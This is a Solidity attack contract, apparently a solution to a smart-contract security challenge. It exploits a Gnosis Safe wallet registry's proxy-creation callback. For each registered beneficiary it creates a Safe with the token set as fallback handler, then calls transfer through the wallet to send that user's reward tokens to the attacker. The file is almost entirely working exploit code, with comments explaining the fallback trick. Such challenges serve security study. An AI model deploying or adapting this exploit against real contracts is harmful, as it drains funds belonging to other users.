// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";

contract BackdoorAttacker {
    address public walletRegistryAddress;
    address public masterCopyAddress;
    GnosisSafeProxyFactory public walletFactory;
    IERC20 public token;
    address[] public users;

    constructor(
        address _walletRegistryAddress,
        address _masterCopyAddress,
        address _walletFactoryAddress,
        address _tokenAddress,
        address[] memory _users
    ) {
        walletRegistryAddress = _walletRegistryAddress;
        masterCopyAddress = _masterCopyAddress;
        walletFactory = GnosisSafeProxyFactory(_walletFactoryAddress);
        token = IERC20(_tokenAddress);
        users = _users;
    }

    function attack() public {
        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owner = new address[](1);
            owner[0] = users[i];

            /**
               We use function createProxyWithCallback from walletFactory
               function createProxyWithCallback(
               address _singleton,
               bytes memory initializer,
               uint256 saltNonce,
               IProxyCreationCallback callback)
               public returns (GnosisSafeProxy proxy)

               This function set address of token in the slot gived in
               FALLBACK_HANDLER_STORAGE_SLOT in FallbackMenager.sol
               Thanks that when we use transfer function, which is not 
               defined in GnosiSafe, it will call fallback, and then
               the called by us function will be called from the address
               from FALLBACK_HANDLER_STORAGE_SLOT so from token.
             */

            GnosisSafeProxy wallet = walletFactory.createProxyWithCallback(
                masterCopyAddress, // Singleton, the Gnosis master copy
                abi.encodeWithSelector(
                    GnosisSafe.setup.selector, // Function signature to call, must be setup()
                    owner, // Must be exactly one of the registered beneficiaries
                    1, // Threshold, must be 1
                    address(0x0), // We don't care
                    0x0, // We don't care
                    address(token), // Token address will be the handler address
                    address(0x0), // We don't care
                    0, // We don't care
                    address(0x0) // We don't care
                ),
                0, // We don't care
                IProxyCreationCallback(walletRegistryAddress) // Registry has the callback we want to exploit);
            );

            IERC20(address(wallet)).transfer(msg.sender, 10 ether);
        }
    }
}
